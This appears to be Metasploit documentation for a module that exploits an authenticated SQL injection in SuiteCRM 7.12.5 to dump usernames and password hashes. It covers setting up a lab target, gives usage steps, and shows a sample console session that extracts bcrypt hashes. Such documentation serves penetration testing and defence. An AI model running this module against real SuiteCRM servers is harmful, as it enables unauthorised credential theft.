## Description
This module exploits an authenticated SQL injection in SuiteCRM installations below or equal to version 7.12.5. The 
vulnerability allows for union and blind boolean based SQLi to be exploited in order to collect usernames and password 
hashes from the SuiteCRM database.

## Vulnerable Application

The SQLi exploited by this module depends on the existence of at least one 'Account' being registered in SuiteCRM.
There should be one in SuiteCRM by default for the administrative user. If you want to test multiple users,
browse to `/index.php?module=Users&action=index` and then click the `Create New User` button on the left side
of the screen. Then enter a username and a last name. Then click the `password` tab, and enter a password for
the user, then confirm this password and click the `Save` button to create the user.

### Docker compose

**Prerequisites:** [Docker](https://docs.docker.com/get-docker/) and
[Docker Compose](https://docs.docker.com/compose/install/) must be
installed first.

To create a SuiteCRM 7.12.5 Docker container, first create a new folder, 
then save the following content as `docker-compose.yml`:

```
version: '2'
services:
  mariadb:
    image: docker.io/bitnami/mariadb:10.6
    environment:
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
      - MARIADB_USER=bn_suitecrm
      - MARIADB_DATABASE=bitnami_suitecrm
      - MARIADB_PASSWORD=bitnami123
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
  suitecrm:
    image: docker.io/bitnami/suitecrm:7.12.5
    ports:
      - '80:8080'
      - '443:8443'
    environment:
      - SUITECRM_DATABASE_HOST=mariadb
      - SUITECRM_DATABASE_PORT_NUMBER=3306
      - SUITECRM_DATABASE_USER=bn_suitecrm
      - SUITECRM_DATABASE_NAME=bitnami_suitecrm
      - SUITECRM_DATABASE_PASSWORD=bitnami123
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
    volumes:
      - 'suitecrm_data:/bitnami/suitecrm'
    depends_on:
      - mariadb
volumes:
  mariadb_data:
    driver: local
  suitecrm_data:
    driver: local 
```

Finally, in the same directory as the `docker-compose.yml` file, run: `docker-compose up -d`.

Note that the default username to log in will be `user` and the password will be `bitnami`. If you
want to change these, put the following lines under the `environment` section:

```
    environment:
      - SUITECRM_USERNAME=my_user
      - SUITECRM_PASSWORD=my_password
```

The above would set the username to `my_user` and the password to `my_password`.

For more information on the docker compose file, refer to
https://github.com/bitnami/containers/tree/main/bitnami/suitecrm.

### Install from source

Source code can be found here: [SuiteCRM v7.12.5](https://github.com/salesagility/SuiteCRM/archive/refs/tags/v7.12.5.tar.gz) 

Instructions on installing from source can be found here: [Installation Guide](https://docs.suitecrm.com/admin/installation-guide/downloading-installing/) 

The following setup was installed on Ubuntu 20.04:

1. Setup and install MySQL:
    1. `sudo apt update`
    1. `sudo apt install mysql-server`
    1. `sudo systemctl start mysql.service`
    1. `sudo mysql` (open the mysql prompt)
    1. `mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';` (change the password 
       of the root user)
       
1. Install Apache
    1. `sudo apt install apache2`
    1. `sudo systemctl enable apache2`
    1. `sudo systemctl start apache2`
       
1. Install php and its dependencies
    1. `sudo apt -y install php7.4`
    1. `sudo apt install -y php-cli php-common php-curl php-mbstring php-gd php-mysql php-soap php-xml php-imap php-intl php-opcache php-json php-zip`
    1. `sudo apt install composer`
    1. `composer install`
    
1. Setup and install SuiteCRM 7.12.5
    1. `wget https://github.com/salesagility/SuiteCRM/archive/refs/tags/v7.12.5.tar.gz`
    1. `gunzip v7.12.5.tar.gz`
    1. `tar -xvf v7.12.5.tar`
    1. `sudo cp -r SuiteCRM-7.12.5/. /var/www/html`
    1. `cd /var/www/html`
    1. `sudo chown -R www-data:www-data .`
    1. `sudo chmod -R 755 .`
    1. `sudo chmod -R 775 custom modules themes data upload`
    1. `sudo chmod 775 config_override.php 2>/dev/null`
    1. Navigate to http://localhost/install.php and follow the installation wizard to complete the install
    

## Verification Steps

1. Start up metasploit
1. Do: `use auxiliary/gather/suite_crm_export_sqli`
1. Do: `set RHOSTS [IP]`
1. Configure a user and password by setting `USERNAME` and `PASSWORD`.
1. Do: `run`

## Scenarios

### SuiteCRM 7.12.5 Bitnami Docker Image
```
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/gather/suite_crm_export_sqli 
msf6 auxiliary(gather/suite_crm_export_sqli) > show options

Module options (auxiliary/gather/suite_crm_export_sqli):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   COUNT     3                no        Number of users to enumerate
   PASSWORD                   yes       Password for user
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasp
                                        loit
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME                   yes       Username of user
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name              Description
   ----              -----------
   Dump credentials  Dumps usernames and passwords from the users table


msf6 auxiliary(gather/suite_crm_export_sqli) > set USERNAME user
USERNAME => user
msf6 auxiliary(gather/suite_crm_export_sqli) > set PASSWORD bitnami
PASSWORD => bitnami
msf6 auxiliary(gather/suite_crm_export_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/suite_crm_export_sqli) > check

[*] Authenticating as user
[+] Authenticated as: user
[*] Version detected: 7.12.5
[+] 127.0.0.1:80 - The target is vulnerable.
msf6 auxiliary(gather/suite_crm_export_sqli) > run
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Authenticating as user
[+] Authenticated as: user
[*] Version detected: 7.12.5
[+] The target is vulnerable.
[*] Fetching Users, please wait...
SuiteCRM User Names
===================

 Username
 --------
 testuser
 user

[*] Fetching Hashes, please wait...
[+] (1/2) Username : testuser ; Hash : $2y$10$YFr9.QNPVDXoLKv5FQo7d.UIRBSMTnPGDS2LLHsuGSojAA2Q5kELa
[+] (2/2) Username : user ; Hash : $2y$10$O83wcCVEfY7GKo//dbQwwOFOevfLFnhpP4d9n98HmGM2YPxJZqMhO
SuiteCRM User Credentials
=========================

 Username  Hash
 --------  ----
 testuser  $2y$10$YFr9.QNPVDXoLKv5FQo7d.UIRBSMTnPGDS2LLHsuGSojAA2Q5kELa
 user      $2y$10$O83wcCVEfY7GKo//dbQwwOFOevfLFnhpP4d9n98HmGM2YPxJZqMhO

[*] Auxiliary module execution completed
msf6 auxiliary(gather/suite_crm_export_sqli) > 
```